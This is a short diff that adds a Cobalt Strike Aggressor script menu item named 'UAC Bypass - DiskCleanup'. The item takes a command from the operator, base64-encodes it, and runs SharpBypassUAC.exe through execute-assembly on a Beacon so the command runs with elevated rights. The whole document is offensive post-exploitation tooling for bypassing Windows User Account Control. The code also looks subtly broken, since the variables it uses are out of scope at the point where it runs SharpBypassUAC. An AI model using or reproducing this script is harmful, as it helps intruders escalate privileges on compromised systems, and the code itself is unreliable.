@@ -1,0 +1,15 @@
+item "UAC Bypass - DiskCleanup"{
+	local('$bid');
+		foreach $bid ($1){
+			diskCleanup_bypass($bid);
+		}
+	}
+
+
+
+sub diskCleanup_bypass{
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($bid, script_resource('exe/SharpBypassUAC.exe'),"-b diskcleanup -e $b64");
+}
